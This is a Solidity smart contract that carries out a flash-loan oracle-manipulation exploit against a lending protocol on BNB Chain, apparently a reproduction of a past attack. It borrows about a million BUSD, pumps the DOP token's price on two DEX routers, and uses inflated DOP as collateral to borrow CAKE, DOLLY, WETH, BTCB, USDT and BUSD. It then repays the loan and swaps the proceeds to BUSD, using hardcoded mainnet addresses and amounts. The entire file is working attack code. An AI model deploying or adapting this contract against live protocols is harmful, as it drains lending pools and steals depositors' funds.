// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ILoanToken {
    function borrow(
        bytes32 loanId,
        uint256 withdrawAmount,
        uint256 initialLoanDuration,
        uint256 collateralTokenSent,
        address collateralTokenAddress,
        address borrower,
        address receiver,
        bytes memory data
    ) external payable;

    function loanTokenAddress() external view returns (address);
}

contract PloutzOraclePump {
    address internal constant PancakeSwap = 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16; // BUSD flash-loan pair
    address internal constant TwindexSwapRouter = 0x6B011d0d53b0Da6ace2a3F436Fd197A4E35f47EF;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address internal constant pCAKE = 0x539Ff593840387439196721cB2Ce5a94051DAEB6;
    address internal constant pDOLLY = 0xD90EFadeA37a6dB7f6EAC73cC9627Ca87aC7F705;
    address internal constant pWETH = 0xBfA0eD8a55D0d83eD92a9A96c35D59a54D238872;
    address internal constant pBTCB = 0x1EF256E054C838B0C5a544149459C7F719Ff7A8d;
    address internal constant pUSDT = 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117;
    address internal constant pBUSD = 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb;

    address internal constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address internal constant DOP = 0x844FA82f1E54824655470970F7004Dd90546bB28;

    // Mirrors testExploit(): flash-loan 1,000,400 BUSD, then (after the callback
    // returns and the loan is repaid) dump every borrowed non-BUSD asset to BUSD.
    function run() external {
        // DOP must be approved to each pToken so borrow() can pull the collateral.
        IERC20(DOP).approve(pCAKE, type(uint256).max);
        IERC20(DOP).approve(pDOLLY, type(uint256).max);
        IERC20(DOP).approve(pWETH, type(uint256).max);
        IERC20(DOP).approve(pBTCB, type(uint256).max);
        IERC20(DOP).approve(pUSDT, type(uint256).max);
        IERC20(DOP).approve(pBUSD, type(uint256).max);

        uint256 _amount0Out = 0;
        uint256 _amount1Out = 1_000_400.0 ether;
        IUniswapV2Pair(PancakeSwap).swap(_amount0Out, _amount1Out, address(this), "X");

        swapLoanedTokenToStables();
    }

    function swapLoanedTokenToStables() internal {
        swapLoanedTokenToStable(pCAKE);
        swapLoanedTokenToStable(pDOLLY);
        swapLoanedTokenToStable(pWETH);
        swapLoanedTokenToStable(pBTCB);
        swapLoanedTokenToStable(pUSDT);
    }

    function pancakeCall(address, uint256, uint256, bytes memory) external {
        require(msg.sender == PancakeSwap, "only flash pair");

        // Pump the price of DOP in both pairs.
        swapTokenToToken(BUSD, DOP, 1_000_000 ether, TwindexSwapRouter);
        swapTokenToToken(BUSD, DOP, 400 ether, PancakeRouter);

        // Here we borrow the assets, using a few DOP which is overvalued.
        borrowMultipleLoans();

        // Swap enough DOP to BUSD to pay back the flash loan and keep the profit.
        swapTokenToToken(DOP, BUSD, 570_625_638_619_593_832_545_805, TwindexSwapRouter);

        // Pay back the flash loan.
        IERC20(BUSD).transfer(PancakeSwap, 1_002_951.02 ether);
    }

    function borrowMultipleLoans() internal {
        // CAKE loan
        borrowSingleLoan(pCAKE, 85 ether, 50 ether);
        // DOLLY loan
        borrowSingleLoan(pDOLLY, 18_000 ether, 500.0 ether);
        // WETH loan
        borrowSingleLoan(pWETH, 18 ether, 1900 ether);
        // BTCB loan
        borrowSingleLoan(pBTCB, 1.6 ether, 2000 ether);
        // USDT loan
        borrowSingleLoan(pUSDT, 89_000 ether, 2000 ether);
        // BUSD loan
        borrowSingleLoan(pBUSD, 90_000 ether, 2000 ether);
    }

    function swapLoanedTokenToStable(address lToken) internal {
        address assetIn = ILoanToken(lToken).loanTokenAddress();
        uint256 amountIn = IERC20(assetIn).balanceOf(address(this));
        swapTokenToToken(assetIn, BUSD, amountIn, PancakeRouter);
    }

    function swapTokenToToken(address tokenIn, address tokenOut, uint256 amountIn, address router) internal {
        if (amountIn == 0) return;
        IERC20(tokenIn).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniswapV2Router(router).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    function borrowSingleLoan(address token, uint256 withdrawAmount, uint256 collateralTokenSent) internal {
        ILoanToken(token).borrow(
            bytes32(0), withdrawAmount, 7200, collateralTokenSent, DOP, address(this), address(this), ""
        );
    }
}
